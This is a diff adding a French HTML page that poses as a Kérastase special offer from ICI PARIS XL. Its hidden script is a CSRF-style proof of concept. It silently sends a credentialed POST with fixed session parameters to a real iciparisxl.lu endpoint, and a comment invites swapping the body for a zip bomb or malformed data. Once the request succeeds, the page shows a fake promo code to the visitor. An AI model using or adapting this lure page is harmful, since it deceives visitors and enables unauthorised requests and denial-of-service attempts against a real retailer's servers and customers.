@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Offre spéciale Kérastase – ICI PARIS XL</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #e5007d; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <p>Chargement de votre offre exclusive...</p>
+
+    <script>
+        (function() {
+            // === Configuration de la charge utile ===
+            // Paramètres fixes (extraits de la requête observée)
+            const endpoint = "https://www.iciparisxl.lu/resources/1ade93f5d8f005313236463468176aaaad1001495f588/ah";
+            const params = new URLSearchParams({
+                a: "1701637501",
+                b: "FzSxIS1Zbs4s86mK",   // ID de session – peut être laissé tel quel ou aléatoirisé
+                ss: "2",
+                c: "63468176aaaad1001495f588",
+                d: "0",
+                r: "isNT2k60NIzS0utL",
+                u: "https://www.iciparisxl.lu/kerastase/premiere-bain-decalcifiant-reparateur/shampooing-reparateur-pour-cheveux-abimes/p/BP_1293634?varSel=1293634",
+                h: "1772332740",
+                s: "1",
+                sp: "false",
+                pp: "false",
+                t: Date.now().toString(),  // timestamp actuel
+                sm: "1",
+                tr: "1"
+            });
+
+            // Corps du POST – peut être n'importe quelle chaîne ou binaire
+            const payload = "test_injection";  // Remplacer par un zip bomb, des données malformées, etc.
+
+            // === Envoi silencieux de la requête ===
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", endpoint + "?" + params.toString(), true);
+            xhr.withCredentials = true;  // Pour que les cookies SameSite=None soient envoyés
+            xhr.setRequestHeader("Content-Type", "text/plain");
+
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    console.log("[PoC] Injection réussie – statut 200");
+                    // Optionnel : afficher une confirmation discrète
+                    document.body.innerHTML += "<p style='color:green;'>Votre code promo : <strong>KERASTASE20</strong></p>";
+                } else {
+                    console.log("[PoC] Statut inattendu : " + xhr.status);
+                }
+            };
+
+            xhr.onerror = function() {
+                console.log("[PoC] Erreur réseau");
+            };
+
+            xhr.send(payload);
+        })();
+    </script>
+</body>
+</html>
